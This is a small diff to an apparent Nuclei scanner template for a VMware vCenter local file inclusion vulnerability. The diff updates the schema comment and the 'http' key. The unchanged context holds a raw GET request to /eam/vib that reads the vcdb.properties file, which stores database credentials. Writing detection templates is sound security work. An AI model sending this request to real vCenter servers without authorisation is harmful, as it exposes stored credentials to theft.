@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: vmware-vcenter-lfi
 info:
   name: VMware vCenter - Local File Inclusion
@@ -12,7 +13,7 @@ info:
     cvss-score: 7.5
     cwe-id: CWE-22
   tags: vmware,lfi,vcenter
-requests:
+http:
   - raw:
       - |
         GET /eam/vib?id={{path}}\vcdb.properties HTTP/1.1
